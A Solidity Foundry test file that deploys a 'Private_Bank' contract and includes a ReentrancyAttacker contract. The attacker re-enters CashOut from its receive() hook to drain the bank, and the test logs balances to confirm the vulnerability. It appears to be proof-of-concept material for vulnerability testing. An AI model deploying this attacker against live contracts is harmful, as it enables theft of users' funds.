// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol";

contract ReentrancyTest is Test {
    Private_Bank private_bank;
    Log logContract;
    ReentrancyAttacker attacker;

    function setUp() public {
        // Deploy required contracts
        logContract = new Log();
        private_bank = new Private_Bank(address(logContract));
        
        // Deploy attacker contract
        attacker = new ReentrancyAttacker(address(private_bank));
        
        // Fund attacker: 3 ether total
        vm.deal(address(attacker), 3 ether);
        
        // Deposit 2 ether from attacker to bank
        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}();
    }

    function testReentrancyVulnerability() public {
        // Record balances before attack
        console.log("--- BEFORE-Trigger ---");
        uint initialBankBalance = address(private_bank).balance;
        uint initialAttackerETHBalance = address(attacker).balance;
        uint initialAttackerBankBalance = private_bank.balances(address(attacker));
        console.log("Bank ETH Balance (before):", initialBankBalance);
        console.log("Attacker ETH Balance (before):", initialAttackerETHBalance);
        console.log("Attacker Bank Deposit Balance (before):", initialAttackerBankBalance);

        // Execute reentrancy attack
        console.log("--- Trigger Attack ---");
        attacker.triggerAttack(1 ether);
        
        // Record balances after attack
        console.log("--- AFTER-Trigger ---");
        uint finalBankBalance = address(private_bank).balance;
        uint finalAttackerETHBalance = address(attacker).balance;
        uint finalAttackerBankBalance = private_bank.balances(address(attacker));
        console.log("Bank ETH Balance (after):", finalBankBalance);
        console.log("Attacker ETH Balance (after):", finalAttackerETHBalance);
        console.log("Attacker Bank Deposit Balance (after):", finalAttackerBankBalance);
        
        // Calculate and log differences
        console.log("Diff: Bank ETH Balance Change", int(finalBankBalance) - int(initialBankBalance));
        console.log("Diff: Attacker ETH Balance Change", int(finalAttackerETHBalance) - int(initialAttackerETHBalance));
        console.log("Diff: Attacker Deposit Balance Change", int(finalAttackerBankBalance) - int(initialAttackerBankBalance));
        
        // Determine vulnerability existence
        if (finalBankBalance == 0 && finalAttackerETHBalance == 3 ether) {
            console.log("Vulnerability Exists: Bank drained and attacker received 3 ether");
        } else {
            console.log("Vulnerability not Exist: Attack did not complete successfully");
        }
    }
}

contract ReentrancyAttacker {
    Private_Bank public immutable bank;
    uint private reentrancyCounter;
    uint256 public attackAmount;

    constructor(address _bank) {
        bank = Private_Bank(payable(_bank));
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    receive() external payable {
        reentrancyCounter++;
        if (reentrancyCounter == 1) {
            // Only reenter once
            bank.CashOut(attackAmount);
        }
    }

    function triggerAttack(uint _attackAmount) public {
        attackAmount = _attackAmount;
        // Trigger the first withdrawal
        bank.CashOut(_attackAmount);
    }
}